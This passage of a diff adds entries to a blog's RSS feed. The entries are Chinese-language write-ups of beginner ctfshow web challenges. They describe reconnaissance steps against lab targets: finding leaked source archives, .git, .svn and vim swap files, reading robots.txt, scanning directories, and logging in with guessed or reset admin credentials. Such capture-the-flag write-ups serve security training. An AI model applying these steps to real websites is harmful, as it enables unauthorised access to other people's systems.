+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在POST头加入传参以执行文件post提交的文件内包含的命令&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web01</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web01/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web01/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185131129&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185131129.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目提示：开发注释未及时删除&lt;/strong&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;p&gt;1.连接至题目所给靶场&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/fe385108f879529fda325ab0ff809bac.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;p&gt;2.尝试查看源代码，发现flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/3d77fcd6e2e2393426bb157876f81200.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web02</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web02/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web02/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185152243&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185152243.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目提示：&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CJS%E6%8B%A6%E6%88%AA%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95.md&#34;&gt;js前台拦截&lt;/a&gt; === 无效操作&lt;/strong&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;连接至靶场后发现无法直接查看源码&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/70e348f1a4bced8bd7f0586a276bb3bc.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试关闭chrome的JavaScript功能，刷新靶场&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/229d320da8d96ff1fe8b17c82ccec937.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;成功绕过js拦截，查看源码获得flag&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/d997f5e20f8c471badacf99b464e063a.png&#34; alt=&#34;截图&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/7f60e77885ff13c2e3b157046965005e.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web03</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web03/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web03/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185217139&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185217139.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目提示：没思路的时候抓个包看看，可能会有意外收获&lt;/strong&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;链接至题目靶场，尝试查看源码及url，并未发现可利用项&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/c23d4809107b10707994d5779d0d0fc5.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试使用BurpSuite进行抓包，重放将请求包放出，查看服务器的响应包，发现flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/f30d83c913061b2f8306a0f55a8a7a32.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web04</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web04/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web04/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185258093&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185258093.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;题目提示：总有人把后台地址写入robots，帮黑阔大佬们引路。&lt;/strong&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;链接至题目所给靶场尝试查看源码和URL，并未发现可利用项&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/e80d2fd112ed1d2d951e7f6abe88eb1e.png&#34; alt=&#34;截图&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%85%AC%E5%91%8A%E6%96%87%E4%BB%B6_robots.txt_.md&#34;&gt;robots.txt&lt;/a&gt;，获得提示&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/fbe84328f09812a27f6bbd987d7fcc41.png&#34; alt=&#34;截图&#34; style=&#34;zoom:150%;&#34; /&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问/flagishere.txt，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/a02a126afe29a83d285798f875579e54.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web05</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web05/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web05/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185332833&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185332833.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;查看URL及源代码未发现可用项&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/b48fd2d471d6279b9f7c9a1430f209d6.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问同名&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E6%8A%80%E6%9C%AF%E6%96%87%E6%A1%A3%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%85%AC%E5%91%8A%E6%96%87%E4%BB%B6_robots.txt_.md&#34;&gt;.phps&lt;/a&gt;文件，下载靶场发送的phps文件，查看，发现flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/acf519bff1a68207dc66954ec7002487.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web06</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web06/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web06/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185345764&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185345764.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;连接靶场，尝试查看源代码及URL，未发现利用点&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/fb71e0e5bd3d4881c050ebd9eed6f3f4.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;已知题目提示&lt;code&gt;解压源码到当前目录，测试正常，收工&lt;/code&gt;，可知网站主页源码和源码压缩包在同一目录下。尝试猜测常见源码压缩包名进行穷举，访问www.zip成功。下载源码压缩包进行解压并查看源码，得到flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/a5b4c13d120e074c8ac3bc2dc5375f4c.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;p&gt;&lt;strong&gt;题目提示：考察代码泄露。直接访问url/www.zip,获得flag&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web07</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web07/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web07/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185402277&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185402277.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;连接靶场，尝试查看源代码及URL，未发现利用点&lt;/li&gt;
+&lt;li&gt;题目提示&lt;code&gt;版本控制很重要，但不要部署到生产环境更重要。&lt;/code&gt;，生产环境大概率存在&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2_git%E6%B3%84%E9%9C%B2svn%E6%B3%84%E9%9C%B2vim%E7%BC%93%E5%AD%98%E6%B3%84%E9%9C%B2.md&#34;&gt;git泄露或svn泄露&lt;/a&gt;，尝试访问当前目录下.git目录，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/6cba7737c603998c8ab093fba10ca4ee.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web08</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web08/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web08/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185419241&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185419241.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;连接靶场，尝试查看源代码及URL，未发现利用点&lt;/li&gt;
+&lt;li&gt;题目提示&lt;code&gt;版本控制很重要，但不要部署到生产环境更重要。&lt;/code&gt;，生产环境大概率存在&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2_git%E6%B3%84%E9%9C%B2svn%E6%B3%84%E9%9C%B2vim%E7%BC%93%E5%AD%98%E6%B3%84%E9%9C%B2.md&#34;&gt;git泄露或svn泄露&lt;/a&gt;，尝试访问当前目录下.git目录，无反馈。&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/8ed9b554a5996f236e71ecbe76562c15.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问当前目录下.svn目录，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;./assets/47b0d4a72e4db2f06989e5dcf194cfe7.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web09</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web09/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web09/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185431465&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185431465.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;根据题目提示&lt;code&gt;发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了&lt;/code&gt;猜测为vim缓存文件导致的源码泄露，尝试访问主页同名的&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5C%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2_git%E6%B3%84%E9%9C%B2svn%E6%B3%84%E9%9C%B2vim%E7%BC%93%E5%AD%98%E6%B3%84%E9%9C%B2.md&#34;&gt;缓存文件index.php.swp&lt;/a&gt;，下载后获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/95114960c779ac50fe4a52e4babf89c2.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web10</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web10/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web10/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185447509&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185447509.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;根据题目提示&lt;code&gt;cookie 只是一块饼干，不能存放任何隐私数据&lt;/code&gt;，尝试访问靶场进行抓包&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/3b3453da8729f714e57c383087f258eb.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;将请求包重放得到响应包，观察cookie字段得到url编码下的flag，解码。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/1c9fcd1123191fd77fdefbd182feecc6.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web11</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web11/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web11/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185508692&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185508692.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web12</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web12/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web12/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185515766&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185515766.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;根据提示&lt;code&gt;有时候网站上的公开信息，就是管理员常用密码&lt;/code&gt;，浏览靶场可发现尾部存在疑似密码的数字。&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/5cc24fac732997d2f6020b4f082c5afa.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试使用Dirbuster对靶场进行后台扫描发现公告文件robots.txt及疑似登录目录的/admin&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/4d58a2764ad0caf5bfd46497a8270c57.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问robots.txt，提示访问/admin目录&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/7411587d996c4b97ab00293a74b8b45c.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;访问/admin目录&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/4ddecf2cfbf0cd60851eddacfb3016a4.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;将之前记下的密码输入，猜测用户名为admin尝试登录，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/76579602d90fe19ed71c215090f874f2.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web13</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web13/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web13/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310185542272&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185542272.png&#34;&gt;&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;根据题目提示&lt;code&gt;技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码&lt;/code&gt;，尝试查看源码并搜索&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;常见技术文档文件格式，发现文件vedio.pdf&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/65e03c924d2b6b9dd467889211f588c0.png&#34;&gt;&lt;/p&gt;
+&lt;ol start=&#34;2&#34;&gt;
+&lt;li&gt;下载后打开发现管理员敏感信息&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/eff192a9fc7648b9993ebfe2faeb0300.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试修改url后访问后台&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/92377b5644b6ea49f5e77b1bccfb62b2.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;4.使用账户密码登录后获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/b0d5b3ff8ce1f287eaa73f15b329c59b.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web14</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web14/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web14/</guid>
+      <description>&lt;br/&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250310185602105&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310185602105.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;由题目提示&lt;code&gt;有时候源码里面就能不经意间泄露重要(editor)的信息，默认配置害死人&lt;/code&gt;，查看靶场源码并定位editor字段&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/8a68d859da52a430a2551027c421109e.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;尝试访问&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5Ceditor%E7%BC%96%E8%BE%91%E5%99%A8.md&#34;&gt;editor编辑器&lt;/a&gt;目录/editor并查看文件空间，遍历成功&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/0d0a7435a1542226798edfb0601868aa.png&#34;&gt;&lt;/li&gt;
+&lt;li&gt;查看网站根目录，发现notinghere文件夹，尝试访问，发现flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/ebd1934f0ec6d2d637e2f6b884e2dd62.png&#34;&gt;&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web15</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web15/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web15/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/13b2bb9eaf3e19872b550a1097e68e43.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;根据题目提示&lt;code&gt;公开的信息比如邮箱，可能造成信息泄露，产生严重后果&lt;/code&gt;访问靶场主页，于页尾获得靶场公开的邮箱信息&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/b5d38c6f29aee09c8951264fafdca8e3.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;查询相关QQ账号，获得信息&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;使用dirbuster扫描靶场后台，得到疑似管理员目录/admin&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/3f5f0d8dc3e7482b35716d6ca27aab63.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;尝试访问admin目录&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/82d5fae87ed4a880501b5af76acd0381.png&#34; alt=&#34;截图&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;访问忘记密码foget.php，根据提示输入密保问题重置密码成功&lt;img src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/814bf6a283f8420379edd9433c595129.png&#34; alt=&#34;截图&#34; style=&#34;zoom:50%;&#34; /&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/e3d8062ee4f4be063aebd5a9687f245d.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;猜测用户名为admin并尝试登录，获得flag&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/f76fc867fc5ab3ec92a664724cf6b88d.png&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;</description>
+    </item>
+    <item>
+      <title>Web16</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web16/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/web16/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;截图&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/90d1702027192ee1e8942863df21b0ee.png&#34;&gt;&lt;/p&gt;
+&lt;br/&gt;
+&lt;br/&gt;
+&lt;ol&gt;
